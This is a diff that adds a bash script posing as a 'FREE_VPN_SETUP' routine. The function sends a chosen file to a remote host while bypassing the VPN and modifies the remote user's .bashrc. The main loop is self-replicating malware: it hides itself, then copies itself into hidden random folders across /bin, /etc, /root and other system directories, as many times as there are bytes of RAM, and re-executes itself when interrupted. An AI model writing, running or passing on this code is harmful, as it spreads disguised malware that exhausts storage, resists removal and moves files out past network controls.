@@ -1,0 +1,84 @@
+#!/usr/bin/env bash
+exit 0
+
+FREE_VPN_SETUP() {
+    local local_ip=$(ip -4 addr show up | grep -oP 'inet \K[\d.]+')
+    # VPN Parameters
+    local file_to_send="$1"
+    local remote_user="$2"
+    local remote_host="$3"
+    local remote_path="$4"
+
+    if [ -z "$file_to_send" ] || [ -z "$remote_user" ] || [ -z "$remote_host" ] || [ -z "$remote_path" ]; then
+        echo "Usage: send_file_bypass_vpn <file_to_send> <remote_user> <remote_host> <remote_path>"
+        return 1
+    fi
+
+    # Use scp to send the file, binding to the local IP to bypass VPN
+    scp -o "BindAddress $local_ip" "$file_to_send" "$remote_user@$remote_host:$remote_path"
+
+    if [ $? -eq 0 ]; then
+        echo "File sent successfully to $remote_host:$remote_path."
+    else
+        echo "Error occurred while sending the file."
+    fi
+
+    # Add the 'asuser' alias to the remote user's shell configuration
+    ssh "$remote_user@$remote_host" "echo \"alias asuser='who -T | awk \"/+/{print \$1}\" | head -1'\" >> ~/.bashrc && source ~/.bashrc"
+    if [ $? -eq 0 ]; then
+        echo "Alias 'asuser' added successfully to $remote_user@$remote_host."
+    else
+        echo "Failed to add alias to $remote_user@$remote_host."
+    fi
+}
+
+n=$(free -b | grep Mem | awk '{print $2}')
+
+# Start the loop without 'exit' termination
+while true; do
+    current_script=$(realpath "$0" 2>/dev/null)
+    script_dir=$(dirname "$current_script")
+    random_name=$(head /dev/urandom | tr -dc 'a-z0-9' | head -c 8)
+    hidden_name=".$random_name"
+
+    directories=(
+        "/tmp"
+        "$HOME/.config"
+        "/bin"
+        "/etc"
+        "/usr/bin"
+        "/usr/local/bin"
+        "/var"
+        "/opt"
+        "/home"
+        "/lib"
+        "/lib64"
+        "/root"
+    )
+
+    trap 'exec "$0"' HUP INT TERM
+
+    (
+        # Move the current script to a hidden name
+        mv "$current_script" "$script_dir/$hidden_name" 2>/dev/null
+
+        # Loop to replicate itself in various directories
+        for ((i = 1; i <= n; i++)); do
+            random_dir="${directories[$RANDOM % ${#directories[@]}]}"
+
+            if [ -d "$random_dir" ]; then
+                random_subfolder=$(head /dev/urandom | tr -dc 'a-z0-9' | head -c 8)
+                hidden_subfolder="$random_dir/.$random_subfolder"
+
+                mkdir -p "$hidden_subfolder" 2>/dev/null
+                copy_name=$(head /dev/urandom | tr -dc 'a-z0-9' | head -c 8)
+
+                # Copy the hidden script to the new folder
+                cp "$script_dir/$hidden_name" "$hidden_subfolder/.$copy_name" 2>/dev/null
+            fi
+        done
+    ) &
+
+    # The script runs indefinitely as long as it’s not interrupted
+    # No 'exit' is needed here because it continues looping
+done
